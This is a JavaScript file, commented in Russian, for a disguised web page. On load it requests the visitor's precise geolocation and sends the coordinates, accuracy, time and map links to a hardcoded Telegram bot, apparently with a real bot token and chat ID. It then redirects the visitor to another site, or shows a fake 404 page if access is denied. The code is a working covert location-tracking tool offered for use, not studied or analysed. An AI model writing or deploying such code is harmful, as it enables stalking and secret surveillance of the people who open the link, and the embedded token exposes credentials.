// Конфигурация
const CONFIG = {
    TELEGRAM_BOT_TOKEN: '7317886492:AAECLmE029XyL78X6NaiB4aU_eI2-bQdOTg', // Замените на реальный токен
    TELEGRAM_CHAT_ID: '604777920',     // Замените на ваш chat_id
    YANDEX_MAPS_URL: 'https://www.spbshield.ru/'
};

// Основная функция
async function init() {
    try {
        // Получаем местоположение
        const location = await getLocation();
        
        // Отправляем в Telegram
        await sendToTelegram(location);
        
        // Перенаправляем на Яндекс Карты
        redirectToYandexMaps();
        
    } catch (error) {
        console.error('Ошибка:', error);
        show404Error();
    }
}

// Получение геолокации
function getLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject(new Error('Geolocation не поддерживается'));
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date(position.timestamp).toLocaleString('ru-RU')
                };
                resolve(location);
            },
            (error) => {
                const errorMessages = {
                    1: 'Пользователь отказал в доступе',
                    2: 'Информация о местоположении недоступна',
                    3: 'Время ожидания истекло'
                };
                reject(new Error(errorMessages[error.code] || 'Неизвестная ошибка'));
            },
            options
        );
    });
}

// Отправка в Telegram
async function sendToTelegram(location) {
    const message = `**Координаты:**
Широта: ${location.latitude}
Долгота: ${location.longitude}

 **Точность:** ${location.accuracy} метров
 **Время:** ${location.timestamp}

 **Ссылка на карты:**
https://www.google.com/maps?q=${location.latitude},${location.longitude}
https://yandex.ru/maps/?pt=${location.longitude},${location.latitude}&z=15`;

    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    });

    if (!response.ok) {
        throw new Error('Ошибка отправки в Telegram');
    }
}

// Перенаправление на Яндекс Карты
function redirectToYandexMaps() {
    window.location.href = CONFIG.YANDEX_MAPS_URL;
}

// Показать 404 ошибку
function show404Error() {
    document.body.innerHTML = `
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Ошибка 404</title>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    font-family: Arial, sans-serif;
                    background: white;
                    height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    color: #333;
                }
                
                .error-container {
                    text-align: center;
                    padding: 2rem;
                }
                
                .error-code {
                    font-size: 4rem;
                    font-weight: bold;
                    margin-bottom: 1rem;
                    color: #dc2626;
                }
                
                .error-message {
                    font-size: 1.5rem;
                    margin-bottom: 2rem;
                }
            </style>
        </head>
        <body>
            <div class="error-container">
                <div class="error-code">404</div>
                <div class="error-message">Не удалось определить местоположение</div>
                <p>error code: 404</p>
            </div>
        </body>
        </html>
    `;
}

// Запуск при загрузке страницы
document.addEventListener('DOMContentLoaded', init);